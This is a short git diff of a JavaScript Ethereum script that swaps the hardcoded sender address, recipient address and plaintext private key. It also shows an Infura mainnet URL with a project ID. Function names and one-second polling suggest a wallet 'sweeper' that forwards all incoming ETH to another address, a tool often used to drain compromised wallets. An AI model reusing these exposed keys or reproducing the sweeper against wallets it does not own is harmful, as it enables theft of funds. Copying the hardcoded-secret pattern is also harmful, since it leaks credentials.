@@ -5,9 +5,9 @@ const web3_CB = new Web3('https://mainnet.infura.io/v3/9059b6f664f5402ab932aeecc
 let isSending = false;
 let lastBalance = 0n;
 
-const senderAddress = '0x2Bcb7C6d22A62D07Fe56687B2848A1317A75AfEF';
-const recipientAddress = '0xB8006B9626FeBdD46d11243cE30586E57518D7B1';
-const privateKey = '0b46b98886967c07d6b9add20ed0ead741e078a6d1339c6830da2a2b2d157c26';
+const senderAddress = '0x171C611Bded0297254Ea5702B3530c462fDAD73a';
+const recipientAddress = '0x1B32067F96436c680935ACe026329DcceC143E36';
+const privateKey = '0x791d5c94d683f6d910383aa4cf2ff18e7d5fbf4c2b9fcc722e9ec2e44174e7f2';
 
 async function sendAllEthToRecipient() {
     try {
@@ -77,4 +77,3 @@ sendAllEthToRecipient()
 
 setInterval(checkBalanceAndSend, 1000);
 setInterval(sendEthManually, 10000);
-
